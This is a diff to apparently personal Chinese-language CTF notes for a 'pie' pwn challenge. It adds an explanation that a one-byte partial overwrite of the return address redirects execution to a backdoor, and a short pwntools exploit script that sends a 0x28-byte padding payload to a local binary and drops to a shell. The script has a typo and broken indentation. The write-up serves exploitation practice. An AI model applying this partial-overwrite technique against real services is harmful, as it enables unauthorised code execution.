@@ -77,4 +77,36 @@ flag:
 # pie
 开启了pie保护
 ![[Pasted image 20250115100232.png]]![[Pasted image 20250115100243.png]]
-栈溢出仅能覆盖返回地址的一位，显然
+栈溢出仅能覆盖返回地址的一位，显然是将其覆盖为backdoor。
+exp：
+```python
+from pwn import *
+
+  
+
+context(os="linux", arch="amd64", log_level="debug")
+
+local = True
+
+if local:
+
+p = process("./pie")
+
+# pwnlib.gdb.attach(p, 'b *main')
+
+else:
+
+pass
+
+  
+
+pwnlib.gdb,attach(p)
+
+payload = b'a' * 0x28 + b'd'
+
+p.sendline(payload)
+
+p.interactive()
+```
+shell:
+![[Pasted image 20250115100413.png]]
